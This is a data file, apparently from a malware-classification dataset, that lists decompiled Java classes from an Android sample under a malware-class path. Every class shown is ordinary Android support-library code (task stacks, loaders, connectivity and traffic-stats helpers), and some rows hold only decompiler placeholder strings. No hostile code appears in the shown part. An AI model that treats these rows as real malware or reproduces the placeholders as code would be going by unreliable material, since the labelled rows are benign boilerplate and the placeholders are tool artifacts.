parent=NavUtils.getParentActivityIntent(this.mSourceContext,parent.getComponent());       }       return this;     }  catch (    PackageManager.NameNotFoundException e) {       Log.e(TAG,""Bad ComponentName while traversing activity parent metadata"");       throw new IllegalArgumentException(e);     }   }   public int getIntentCount(){     return this.mIntents.size();   }   public Intent getIntent(  int index){     return editIntentAt(index);   }   public Intent editIntentAt(  int index){     return this.mIntents.get(index);   }   @Override public Iterator<Intent> iterator(){     return this.mIntents.iterator();   }   public void startActivities(){     startActivities(null);   }   public void startActivities(  Bundle options){     if (this.mIntents.isEmpty()) {       throw new IllegalStateException(""No intents added to TaskStackBuilder; cannot startActivities"");     }     Intent[] intents=(Intent[])this.mIntents.toArray(new Intent[this.mIntents.size()]);     intents[0].addFlags(268484608);     if (!ContextCompat.startActivities(this.mSourceContext,intents,options)) {       Intent topIntent=intents[intents.length - 1];       topIntent.addFlags(268435456);       this.mSourceContext.startActivity(topIntent);     }   }   public PendingIntent getPendingIntent(  int requestCode,  int flags){     return getPendingIntent(requestCode,flags,null);   }   public PendingIntent getPendingIntent(  int requestCode,  int flags,  Bundle options){     if (this.mIntents.isEmpty()) {       throw new IllegalStateException(""No intents added to TaskStackBuilder; cannot getPendingIntent"");     }     Intent[] intents=(Intent[])this.mIntents.toArray(new Intent[this.mIntents.size()]);     intents[0].addFlags(268484608);     return IMPL.getPendingIntent(this.mSourceContext,intents,requestCode,flags,options);   }   public Intent[] getIntents(){     return (Intent[])this.mIntents.toArray(new Intent[this.mIntents.size()]);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\TaskStackBuilderHoneycomb.code","public class TaskStackBuilderHoneycomb {   public static PendingIntent getActivitiesPendingIntent(  Context context,  int requestCode,  Intent[] intents,  int flags){     return PendingIntent.getActivities(context,requestCode,intents,flags);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\TaskStackBuilderImpl.code","public interface TaskStackBuilderImpl {   PendingIntent getPendingIntent(  Context context,  Intent[] intentArr,  int i,  int i2,  Bundle bundle); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\TaskStackBuilderImplBase.code","static class TaskStackBuilderImplBase implements TaskStackBuilderImpl {   TaskStackBuilderImplBase(){   }   @Override public PendingIntent getPendingIntent(  Context context,  Intent[] intents,  int requestCode,  int flags,  Bundle options){     Intent topIntent=intents[intents.length - 1];     topIntent.addFlags(268435456);     return PendingIntent.getActivity(context,requestCode,topIntent,flags);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\TaskStackBuilderImplHoneycomb.code","static class TaskStackBuilderImplHoneycomb implements TaskStackBuilderImpl {   TaskStackBuilderImplHoneycomb(){   }   @Override public PendingIntent getPendingIntent(  Context context,  Intent[] intents,  int requestCode,  int flags,  Bundle options){     intents[0].addFlags(268468224);     return TaskStackBuilderHoneycomb.getActivitiesPendingIntent(context,requestCode,intents,flags);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\TaskStackBuilderImplJellybean.code","static class TaskStackBuilderImplJellybean implements TaskStackBuilderImpl {   TaskStackBuilderImplJellybean(){   }   @Override public PendingIntent getPendingIntent(  Context context,  Intent[] intents,  int requestCode,  int flags,  Bundle options){     intents[0].addFlags(268468224);     return TaskStackBuilderJellybean.getActivitiesPendingIntent(context,requestCode,intents,flags,options);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\TaskStackBuilderJellybean.code","class TaskStackBuilderJellybean {   TaskStackBuilderJellybean(){   }   public static PendingIntent getActivitiesPendingIntent(  Context context,  int requestCode,  Intent[] intents,  int flags,  Bundle options){     return PendingIntent.getActivities(context,requestCode,intents,flags,options);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.content\AsyncTaskLoader.code","public abstract class AsyncTaskLoader<D> extends Loader<D> {   static final boolean DEBUG=false;   static final String TAG=""AsyncTaskLoader"";   volatile AsyncTaskLoader<D>.LoadTask mCancellingTask;   Handler mHandler;   long mLastLoadCompleteTime;   volatile AsyncTaskLoader<D>.LoadTask mTask;   long mUpdateThrottle;   public abstract D loadInBackground(); public final class LoadTask extends ModernAsyncTask<Void,Void,D> implements Runnable {     private CountDownLatch done=new CountDownLatch(1);     D result;     boolean waiting;     LoadTask(){     }     @Override public D doInBackground(    Void... voidArr){       this.result=(D)AsyncTaskLoader.this.onLoadInBackground();       return this.result;     }     @Override protected void onPostExecute(    D data){       try {         AsyncTaskLoader.this.dispatchOnLoadComplete(this,data);       }   finally {         this.done.countDown();       }     }     @Override protected void onCancelled(){       try {         AsyncTaskLoader.this.dispatchOnCancelled(this,this.result);       }   finally {         this.done.countDown();       }     }     @Override public void run(){       this.waiting=AsyncTaskLoader.DEBUG;       AsyncTaskLoader.this.executePendingTask();     }   }   public AsyncTaskLoader(  Context context){     super(context);     this.mLastLoadCompleteTime=-10000L;   }   public void setUpdateThrottle(  long delayMS){     this.mUpdateThrottle=delayMS;     if (delayMS != 0) {       this.mHandler=new Handler();     }   }   @Override public void onForceLoad(){     super.onForceLoad();     cancelLoad();     this.mTask=new LoadTask();     executePendingTask();   }   public boolean cancelLoad(){     boolean cancelled=DEBUG;     if (this.mTask != null) {       if (this.mCancellingTask != null) {         if (this.mTask.waiting) {           this.mTask.waiting=DEBUG;           this.mHandler.removeCallbacks(this.mTask);         }         this.mTask=null;       }  else       if (this.mTask.waiting) {         this.mTask.waiting=DEBUG;         this.mHandler.removeCallbacks(this.mTask);         this.mTask=null;       }  else {         cancelled=this.mTask.cancel(DEBUG);         if (cancelled) {           this.mCancellingTask=this.mTask;         }         this.mTask=null;       }     }     return cancelled;   }   public void onCanceled(  D data){   }   void executePendingTask(){     if (this.mCancellingTask == null && this.mTask != null) {       if (this.mTask.waiting) {         this.mTask.waiting=DEBUG;         this.mHandler.removeCallbacks(this.mTask);       }       if (this.mUpdateThrottle > 0) {         long now=SystemClock.uptimeMillis();         if (now < this.mLastLoadCompleteTime + this.mUpdateThrottle) {           this.mTask.waiting=true;           this.mHandler.postAtTime(this.mTask,this.mLastLoadCompleteTime + this.mUpdateThrottle);           return;         }       }       this.mTask.executeOnExecutor(ModernAsyncTask.THREAD_POOL_EXECUTOR,(Void[])null);     }   }   void dispatchOnCancelled(  AsyncTaskLoader<D>.LoadTask task,  D data){     onCanceled(data);     if (this.mCancellingTask == task) {       this.mLastLoadCompleteTime=SystemClock.uptimeMillis();       this.mCancellingTask=null;       executePendingTask();     }   }   void dispatchOnLoadComplete(  AsyncTaskLoader<D>.LoadTask task,  D data){     if (this.mTask != task) {       dispatchOnCancelled(task,data);     }  else {       if (isAbandoned()) {         onCanceled(data);         return;       }       this.mLastLoadCompleteTime=SystemClock.uptimeMillis();       this.mTask=null;       deliverResult(data);     }   }   protected D onLoadInBackground(){     return loadInBackground();   }   public void waitForLoader(){     AsyncTaskLoader<D>.LoadTask task=this.mTask;     if (task != null) {       try {         ((LoadTask)task).done.await();       }  catch (      InterruptedException e) {       }     }   }   @Override public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     super.dump(prefix,fd,writer,args);     if (this.mTask != null) {       writer.print(prefix);       writer.print(""mTask="");       writer.print(this.mTask);       writer.print("" waiting="");       writer.println(this.mTask.waiting);     }     if (this.mCancellingTask != null) {       writer.print(prefix);       writer.print(""mCancellingTask="");       writer.print(this.mCancellingTask);       writer.print("" waiting="");       writer.println(this.mCancellingTask.waiting);     }     if (this.mUpdateThrottle != 0) {       writer.print(prefix);       writer.print(""mUpdateThrottle="");       TimeUtils.formatDuration(this.mUpdateThrottle,writer);       writer.print("" mLastLoadCompleteTime="");       TimeUtils.formatDuration(this.mLastLoadCompleteTime,SystemClock.uptimeMillis(),writer);       writer.println();     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.content\AsyncTaskResult.code","public static class AsyncTaskResult<Data> {   final Data[] mData;   final ModernAsyncTask mTask;   AsyncTaskResult(  ModernAsyncTask task,  Data... data){     this.mTask=task;     this.mData=data;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.content\BroadcastRecord.code","public static class BroadcastRecord {   final Intent intent;   final ArrayList<ReceiverRecord> receivers;   BroadcastRecord(  Intent _intent,  ArrayList<ReceiverRecord> _receivers){     this.intent=_intent;     this.receivers=_receivers;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.content\ContextCompat.code","public class ContextCompat {   public static boolean startActivities(  Context context,  Intent[] intents){     return startActivities(context,intents,null);   }   public static boolean startActivities(  Context context,  Intent[] intents,  Bundle options){     int version=Build.VERSION.SDK_INT;     if (version >= 16) {       ContextCompatJellybean.startActivities(context,intents,options);       return true;     }     if (version >= 11) {       ContextCompatHoneycomb.startActivities(context,intents);       return true;     }     return false;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.content\ContextCompatHoneycomb.code","class ContextCompatHoneycomb {   ContextCompatHoneycomb(){   }   public static void startActivities(  Context context,  Intent[] intents){     context.startActivities(intents);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.content\ContextCompatJellybean.code","class ContextCompatJellybean {   ContextCompatJellybean(){   }   public static void startActivities(  Context context,  Intent[] intents,  Bundle options){     context.startActivities(intents,options);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.content\CursorLoader.code","public class CursorLoader extends AsyncTaskLoader<Cursor> {   Cursor mCursor;   final Loader<Cursor>.ForceLoadContentObserver mObserver;   String[] mProjection;   String mSelection;   String[] mSelectionArgs;   String mSortOrder;   Uri mUri;   @Override public Cursor loadInBackground(){     Cursor cursor=getContext().getContentResolver().query(this.mUri,this.mProjection,this.mSelection,this.mSelectionArgs,this.mSortOrder);     if (cursor != null) {       cursor.getCount();       registerContentObserver(cursor,this.mObserver);     }     return cursor;   }   void registerContentObserver(  Cursor cursor,  ContentObserver observer){     cursor.registerContentObserver(this.mObserver);   }   @Override public void deliverResult(  Cursor cursor){     if (isReset()) {       if (cursor != null) {         cursor.close();         return;       }       return;     }     Cursor oldCursor=this.mCursor;     this.mCursor=cursor;     if (isStarted()) {       super.deliverResult((CursorLoader)cursor);     }     if (oldCursor != null && oldCursor != cursor && !oldCursor.isClosed()) {       oldCursor.close();     }   }   public CursorLoader(  Context context){     super(context);     this.mObserver=new Loader.ForceLoadContentObserver();   }   public CursorLoader(  Context context,  Uri uri,  String[] projection,  String selection,  String[] selectionArgs,  String sortOrder){     super(context);     this.mObserver=new Loader.ForceLoadContentObserver();     this.mUri=uri;     this.mProjection=projection;     this.mSelection=selection;     this.mSelectionArgs=selectionArgs;     this.mSortOrder=sortOrder;   }   @Override protected void onStartLoading(){     if (this.mCursor != null) {       deliverResult(this.mCursor);     }     if (takeContentChanged() || this.mCursor == null) {       forceLoad();     }   }   @Override protected void onStopLoading(){     cancelLoad();   }   @Override public void onCanceled(  Cursor cursor){     if (cursor != null && !cursor.isClosed()) {       cursor.close();     }   }   @Override public void onReset(){     super.onReset();     onStopLoading();     if (this.mCursor != null && !this.mCursor.isClosed()) {       this.mCursor.close();     }     this.mCursor=null;   }   public Uri getUri(){     return this.mUri;   }   public void setUri(  Uri uri){     this.mUri=uri;   }   public String[] getProjection(){     return this.mProjection;   }   public void setProjection(  String[] projection){     this.mProjection=projection;   }   public String getSelection(){     return this.mSelection;   }   public void setSelection(  String selection){     this.mSelection=selection;   }   public String[] getSelectionArgs(){     return this.mSelectionArgs;   }   public void setSelectionArgs(  String[] selectionArgs){     this.mSelectionArgs=selectionArgs;   }   public String getSortOrder(){     return this.mSortOrder;   }   public void setSortOrder(  String sortOrder){     this.mSortOrder=sortOrder;   }   @Override public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     super.dump(prefix,fd,writer,args);     writer.print(prefix);     writer.print(""mUri="");     writer.println(this.mUri);     writer.print(prefix);     writer.print(""mProjection="");     writer.println(Arrays.toString(this.mProjection));     writer.print(prefix);     writer.print(""mSelection="");     writer.println(this.mSelection);     writer.print(prefix);     writer.print(""mSelectionArgs="");     writer.println(Arrays.toString(this.mSelectionArgs));     writer.print(prefix);     writer.print(""mSortOrder="");     writer.println(this.mSortOrder);     writer.print(prefix);     writer.print(""mCursor="");     writer.println(this.mCursor);     writer.print(prefix);     writer.print(""mContentChanged="");     writer.println(this.mContentChanged);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.content\ForceLoadContentObserver.code","public final class ForceLoadContentObserver extends ContentObserver {   public ForceLoadContentObserver(){     super(new Handler());   }   @Override public boolean deliverSelfNotifications(){     return true;   }   @Override public void onChange(  boolean selfChange){     Loader.this.onContentChanged();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.content\IntentCompat.code","public class IntentCompat {   public static final String ACTION_EXTERNAL_APPLICATIONS_AVAILABLE=""android.intent.action.EXTERNAL_APPLICATIONS_AVAILABLE"";   public static final String ACTION_EXTERNAL_APPLICATIONS_UNAVAILABLE=""android.intent.action.EXTERNAL_APPLICATIONS_UNAVAILABLE"";   public static final String EXTRA_CHANGED_PACKAGE_LIST=""android.intent.extra.changed_package_list"";   public static final String EXTRA_CHANGED_UID_LIST=""android.intent.extra.changed_uid_list"";   public static final String EXTRA_HTML_TEXT=""android.intent.extra.HTML_TEXT"";   public static final int FLAG_ACTIVITY_CLEAR_TASK=32768;   public static final int FLAG_ACTIVITY_TASK_ON_HOME=16384;   private IntentCompat(){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.content\InternalHandler.code","!org.eclipse.jdt.core.dom.TypeDeclaration@2e16c98b"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.content\Loader.code","public class Loader<D> {   Context mContext;   int mId;   OnLoadCompleteListener<D> mListener;   boolean mStarted=false;   boolean mAbandoned=false;   boolean mReset=true;   boolean mContentChanged=false; public interface OnLoadCompleteListener<D> {     void onLoadComplete(    Loader<D> loader,    D d);   } public final class ForceLoadContentObserver extends ContentObserver {     public ForceLoadContentObserver(){       super(new Handler());     }     @Override public boolean deliverSelfNotifications(){       return true;     }     @Override public void onChange(    boolean selfChange){       Loader.this.onContentChanged();     }   }   public Loader(  Context context){     this.mContext=context.getApplicationContext();   }   public void deliverResult(  D data){     if (this.mListener != null) {       this.mListener.onLoadComplete(this,data);     }   }   public Context getContext(){     return this.mContext;   }   public int getId(){     return this.mId;   }   public void registerListener(  int id,  OnLoadCompleteListener<D> listener){     if (this.mListener != null) {       throw new IllegalStateException(""There is already a listener registered"");     }     this.mListener=listener;     this.mId=id;   }   public void unregisterListener(  OnLoadCompleteListener<D> listener){     if (this.mListener == null) {       throw new IllegalStateException(""No listener register"");     }     if (this.mListener != listener) {       throw new IllegalArgumentException(""Attempting to unregister the wrong listener"");     }     this.mListener=null;   }   public boolean isStarted(){     return this.mStarted;   }   public boolean isAbandoned(){     return this.mAbandoned;   }   public boolean isReset(){     return this.mReset;   }   public final void startLoading(){     this.mStarted=true;     this.mReset=false;     this.mAbandoned=false;     onStartLoading();   }   protected void onStartLoading(){   }   public void forceLoad(){     onForceLoad();   }   public void onForceLoad(){   }   public void stopLoading(){     this.mStarted=false;     onStopLoading();   }   protected void onStopLoading(){   }   public void abandon(){     this.mAbandoned=true;     onAbandon();   }   protected void onAbandon(){   }   public void reset(){     onReset();     this.mReset=true;     this.mStarted=false;     this.mAbandoned=false;     this.mContentChanged=false;   }   public void onReset(){   }   public boolean takeContentChanged(){     boolean res=this.mContentChanged;     this.mContentChanged=false;     return res;   }   public void onContentChanged(){     if (this.mStarted) {       forceLoad();     }  else {       this.mContentChanged=true;     }   }   public String dataToString(  D data){     StringBuilder sb=new StringBuilder(64);     DebugUtils.buildShortClassTag(data,sb);     sb.append(""}"");     return sb.toString();   }   public String toString(){     StringBuilder sb=new StringBuilder(64);     DebugUtils.buildShortClassTag(this,sb);     sb.append("" id="");     sb.append(this.mId);     sb.append(""}"");     return sb.toString();   }   public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     writer.print(prefix);     writer.print(""mId="");     writer.print(this.mId);     writer.print("" mListener="");     writer.println(this.mListener);     writer.print(prefix);     writer.print(""mStarted="");     writer.print(this.mStarted);     writer.print("" mContentChanged="");     writer.print(this.mContentChanged);     writer.print("" mAbandoned="");     writer.print(this.mAbandoned);     writer.print("" mReset="");     writer.println(this.mReset);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.content\LoadTask.code","public final class LoadTask extends ModernAsyncTask<Void,Void,D> implements Runnable {   private CountDownLatch done=new CountDownLatch(1);   D result;   boolean waiting;   LoadTask(){   }   @Override public D doInBackground(  Void... voidArr){     this.result=(D)AsyncTaskLoader.this.onLoadInBackground();     return this.result;   }   @Override protected void onPostExecute(  D data){     try {       AsyncTaskLoader.this.dispatchOnLoadComplete(this,data);     }   finally {       this.done.countDown();     }   }   @Override protected void onCancelled(){     try {       AsyncTaskLoader.this.dispatchOnCancelled(this,this.result);     }   finally {       this.done.countDown();     }   }   @Override public void run(){     this.waiting=AsyncTaskLoader.DEBUG;     AsyncTaskLoader.this.executePendingTask();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.content\LocalBroadcastManager.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5e0bf895"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.content\ModernAsyncTask.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4c40aed1"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.content\OnLoadCompleteListener.code","public interface OnLoadCompleteListener<D> {   void onLoadComplete(  Loader<D> loader,  D d); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.content\ReceiverRecord.code","public static class ReceiverRecord {   boolean broadcasting;   final IntentFilter filter;   final BroadcastReceiver receiver;   ReceiverRecord(  IntentFilter _filter,  BroadcastReceiver _receiver){     this.filter=_filter;     this.receiver=_receiver;   }   public String toString(){     StringBuilder builder=new StringBuilder(128);     builder.append(""Receiver{"");     builder.append(this.receiver);     builder.append("" filter="");     builder.append(this.filter);     builder.append(""}"");     return builder.toString();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.content\WorkerRunnable.code","public static abstract class WorkerRunnable<Params,Result> implements Callable<Result> {   Params[] mParams;   private WorkerRunnable(){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.content.pm\ActivityInfoCompat.code","public class ActivityInfoCompat {   public static final int CONFIG_UI_MODE=512;   private ActivityInfoCompat(){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.database\DatabaseUtilsCompat.code","public class DatabaseUtilsCompat {   private DatabaseUtilsCompat(){   }   public static String concatenateWhere(  String a,  String b){     if (TextUtils.isEmpty(a)) {       return b;     }     return TextUtils.isEmpty(b) ? a : ""("" + a + "") AND (""+ b+ "")"";   }   public static String[] appendSelectionArgs(  String[] originalValues,  String[] newValues){     if (originalValues == null || originalValues.length == 0) {       return newValues;     }     String[] result=new String[originalValues.length + newValues.length];     System.arraycopy(originalValues,0,result,0,originalValues.length);     System.arraycopy(newValues,0,result,originalValues.length,newValues.length);     return result;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.net\BaseConnectivityManagerCompatImpl.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1f0eabb8"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.net\BaseTrafficStatsCompatImpl.code","static class BaseTrafficStatsCompatImpl implements TrafficStatsCompatImpl {   private ThreadLocal<SocketTags> mThreadSocketTags=new ThreadLocal<SocketTags>(){     @Override public SocketTags initialValue(){       return new SocketTags();     }   } ; public static class SocketTags {     public int statsTag;     private SocketTags(){       this.statsTag=-1;     }   }   BaseTrafficStatsCompatImpl(){   }   @Override public void clearThreadStatsTag(){     this.mThreadSocketTags.get().statsTag=-1;   }   @Override public int getThreadStatsTag(){     return this.mThreadSocketTags.get().statsTag;   }   @Override public void incrementOperationCount(  int operationCount){   }   @Override public void incrementOperationCount(  int tag,  int operationCount){   }   @Override public void setThreadStatsTag(  int tag){     this.mThreadSocketTags.get().statsTag=tag;   }   @Override public void tagSocket(  Socket socket){   }   @Override public void untagSocket(  Socket socket){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.net\ConnectivityManagerCompat.code","!org.eclipse.jdt.core.dom.TypeDeclaration@390645a"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.net\ConnectivityManagerCompatGingerbread.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5ac4f417"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.net\ConnectivityManagerCompatHoneycombMR2.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6fff29f4"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.net\ConnectivityManagerCompatImpl.code","interface ConnectivityManagerCompatImpl {   boolean isActiveNetworkMetered(  ConnectivityManager connectivityManager); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.net\ConnectivityManagerCompatJellyBean.code","class ConnectivityManagerCompatJellyBean {   ConnectivityManagerCompatJellyBean(){   }   public static boolean isActiveNetworkMetered(  ConnectivityManager cm){     return cm.isActiveNetworkMetered();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.net\GingerbreadConnectivityManagerCompatImpl.code","static class GingerbreadConnectivityManagerCompatImpl implements ConnectivityManagerCompatImpl {   GingerbreadConnectivityManagerCompatImpl(){   }   @Override public boolean isActiveNetworkMetered(  ConnectivityManager cm){     return ConnectivityManagerCompatGingerbread.isActiveNetworkMetered(cm);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.net\HoneycombMR2ConnectivityManagerCompatImpl.code","static class HoneycombMR2ConnectivityManagerCompatImpl implements ConnectivityManagerCompatImpl {   HoneycombMR2ConnectivityManagerCompatImpl(){   }   @Override public boolean isActiveNetworkMetered(  ConnectivityManager cm){     return ConnectivityManagerCompatHoneycombMR2.isActiveNetworkMetered(cm);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.net\IcsTrafficStatsCompatImpl.code","static class IcsTrafficStatsCompatImpl implements TrafficStatsCompatImpl {   IcsTrafficStatsCompatImpl(){   }   @Override public void clearThreadStatsTag(){     TrafficStatsCompatIcs.clearThreadStatsTag();   }   @Override public int getThreadStatsTag(){     return TrafficStatsCompatIcs.getThreadStatsTag();   }   @Override public void incrementOperationCount(  int operationCount){     TrafficStatsCompatIcs.incrementOperationCount(operationCount);   }   @Override public void incrementOperationCount(  int tag,  int operationCount){     TrafficStatsCompatIcs.incrementOperationCount(tag,operationCount);   }   @Override public void setThreadStatsTag(  int tag){     TrafficStatsCompatIcs.setThreadStatsTag(tag);   }   @Override public void tagSocket(  Socket socket) throws SocketException {     TrafficStatsCompatIcs.tagSocket(socket);   }   @Override public void untagSocket(  Socket socket) throws SocketException {     TrafficStatsCompatIcs.untagSocket(socket);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.net\JellyBeanConnectivityManagerCompatImpl.code","static class JellyBeanConnectivityManagerCompatImpl implements ConnectivityManagerCompatImpl {   JellyBeanConnectivityManagerCompatImpl(){   }   @Override public boolean isActiveNetworkMetered(  ConnectivityManager cm){     return ConnectivityManagerCompatJellyBean.isActiveNetworkMetered(cm);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.net\SocketTags.code","public static class SocketTags {   public int statsTag;   private SocketTags(){     this.statsTag=-1;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.net\TrafficStatsCompat.code","public class TrafficStatsCompat {   private static final TrafficStatsCompatImpl IMPL; interface TrafficStatsCompatImpl {     void clearThreadStatsTag();     int getThreadStatsTag();     void incrementOperationCount(    int i);     void incrementOperationCount(    int i,    int i2);     void setThreadStatsTag(    int i);     void tagSocket(    Socket socket) throws SocketException ;     void untagSocket(    Socket socket) throws SocketException ;   } static class BaseTrafficStatsCompatImpl implements TrafficStatsCompatImpl {     private ThreadLocal<SocketTags> mThreadSocketTags=new ThreadLocal<SocketTags>(){       @Override public SocketTags initialValue(){         return new SocketTags();       }     } ; public static class SocketTags {       public int statsTag;       private SocketTags(){         this.statsTag=-1;       }     }     BaseTrafficStatsCompatImpl(){     }     @Override public void clearThreadStatsTag(){       this.mThreadSocketTags.get().statsTag=-1;     }     @Override public int getThreadStatsTag(){       return this.mThreadSocketTags.get().statsTag;     }     @Override public void incrementOperationCount(    int operationCount){     }     @Override public void incrementOperationCount(    int tag,    int operationCount){     }     @Override public void setThreadStatsTag(    int tag){       this.mThreadSocketTags.get().statsTag=tag;     }     @Override public void tagSocket(    Socket socket){     }     @Override public void untagSocket(    Socket socket){     }   } static class IcsTrafficStatsCompatImpl implements TrafficStatsCompatImpl {     IcsTrafficStatsCompatImpl(){     }     @Override public void clearThreadStatsTag(){       TrafficStatsCompatIcs.clearThreadStatsTag();     }     @Override public int getThreadStatsTag(){       return TrafficStatsCompatIcs.getThreadStatsTag();     }     @Override public void incrementOperationCount(    int operationCount){       TrafficStatsCompatIcs.incrementOperationCount(operationCount);     }     @Override public void incrementOperationCount(    int tag,    int operationCount){       TrafficStatsCompatIcs.incrementOperationCount(tag,operationCount);     }     @Override public void setThreadStatsTag(    int tag){       TrafficStatsCompatIcs.setThreadStatsTag(tag);     }     @Override public void tagSocket(    Socket socket) throws SocketException {       TrafficStatsCompatIcs.tagSocket(socket);     }     @Override public void untagSocket(    Socket socket) throws SocketException {       TrafficStatsCompatIcs.untagSocket(socket);     }   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new IcsTrafficStatsCompatImpl();     }  else {       IMPL=new BaseTrafficStatsCompatImpl();     }   }   public static void clearThreadStatsTag(){     IMPL.clearThreadStatsTag();   }   public static int getThreadStatsTag(){     return IMPL.getThreadStatsTag();   }   public static void incrementOperationCount(  int operationCount){     IMPL.incrementOperationCount(operationCount);   }   public static void incrementOperationCount(  int tag,  int operationCount){     IMPL.incrementOperationCount(tag,operationCount);   }   public static void setThreadStatsTag(  int tag){     IMPL.setThreadStatsTag(tag);   }   public static void tagSocket(  Socket socket) throws SocketException {     IMPL.tagSocket(socket);   }   public static void untagSocket(  Socket socket) throws SocketException {     IMPL.untagSocket(socket);   } } "
